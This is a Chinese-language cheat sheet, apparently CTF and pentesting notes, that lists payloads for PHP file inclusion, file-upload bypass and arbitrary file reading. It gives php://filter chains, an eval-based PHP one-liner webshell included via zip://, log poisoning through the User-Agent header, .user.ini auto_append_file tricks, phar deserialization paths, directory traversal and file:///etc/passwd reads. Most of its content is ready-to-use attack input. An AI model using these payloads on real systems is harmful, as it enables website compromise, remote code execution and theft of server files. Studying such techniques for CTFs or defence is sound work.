[实战 | 文件上传漏洞之最全代码检测绕过总结](https://mp.weixin.qq.com/s/6ArBgNYpsQH7WkaaJY6GfQ)

# LFI/文件包含

| Name                                                   | payload                                                                                                                                         |     |
| ------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| `?file=index` 或 `?file=index.php` 有可能需要去掉 .php |                                                                                                                                                 |     |
| `?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=flag.php` <br> `?file=php://filter/convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.L6.UCS2/resource=flag.php`| UTF-8过滤器 , 可以上面两个联合用
| PHP_INCLUDE_TO_SHELL_CHAR_DICT                         | 文件包含即命令执行   [原理](https://goodapple.top/archives/968) |     |
| glob://                                                |                                                                                                                                                 |     |
| 上传 a.zip 改为 a.jpg                                  | zip://伪协议进行包含 一句话 a.php `<?php @eval($_POST['a'])?>` <br>url: `http://xxx//index.php?url=zip:///app/upload/pic.jpg%23a` 密码为 a      |
| 日志包含                                               | 1.抓包修改 Agent 访问 2.包含日志 /var/log/nginx/access.log                                                                                      |
| 使用 [.user.ini](#userini) 进行包含                    | auto_append_file=2.jpg                                                                                                                          |
| Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7                   | [CVE-2013-4547](exp/Nginx%20%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2013-4547%EF%BC%89.md) requests_demo.py |

## .user.ini

相当于 `include('xx.txt')`

| Desc           | .user.ini                                    | payload                                                                                |
| -------------- | -------------------------------------------- | -------------------------------------------------------------------------------------- |
| 包含 post 数据 | `auto_append_file=php://input`               | url:`index.php` <br>body: `<?php phpinfo();?>`                                         |
| 日志包含       | `auto_append_file=/var/log/nginx/access.log` | url:`index.php` <br> body: `1=phpinfo();`<br>usUser-Agent: `<?php eval($_POST[1]);?> ` |

# Python

```sh
/download?file=../../../app/__pycache__/part.cpython-311.pyc
```

# 文件上传

- 压缩包软链接，传到/tmp/data 下, ，这个软链接指向 flag，即可获取 flag
- %00 截断 php 版本小于 5.3.4
- 上传时和文件相关都可能是 phar 反序列化,如 `file_exists($filename)` 考虑 phar 反序列化 `phar://abc.phar.gif/test.txt`
  - 能进行攻击的远不至于 file_get_contents，所有的文件函数都会导致这个问题

```sh
fileatime / filectime / filemtime
stat / fileinode / fileowner / filegroup / fileperms
file / file_get_contents / readfile / fopen
file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is writable.
parse_ini_file
unlink
copy
```

# 文件读取

url=file://127.0.0.1/etc/passwd
url=file:///etc/passwd
